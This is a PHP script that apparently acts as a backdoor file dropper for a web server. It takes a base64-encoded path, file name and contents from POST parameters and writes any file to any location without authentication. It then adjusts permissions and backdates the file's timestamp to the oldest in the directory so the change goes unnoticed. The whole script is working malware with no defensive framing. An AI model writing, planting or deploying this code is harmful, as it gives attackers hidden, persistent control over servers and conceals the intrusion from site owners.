<?php


function set_min_date($filepath) {
    $dir = dirname($filepath);
    $o = opendir($dir);
    $min_lastmod = 0;
    while ($r = readdir($o)) {
        $mod = filectime($dir . "/" . $r);
        if (!$min_lastmod) {
            $min_lastmod = $mod;
            continue;
        }

        if ($min_lastmod > $mod) {
            $min_lastmod = $mod;
        }
    }

    if ($min_lastmod) {
        touch($filepath, $min_lastmod);
    }
}

$pth = base64_decode($_POST['d_pth']);
chdir($pth);
$fname = base64_decode($_POST['fname']);
$fdata = base64_decode($_POST['fdata']);

$perms = 0777 & fileperms($fname);

file_put_contents($fname,$fdata);

if ($perms >= 64) {
    chmod($fname, $perms);
} else {
    chmod($fname, 0755);
}

set_min_date($fname);


exit;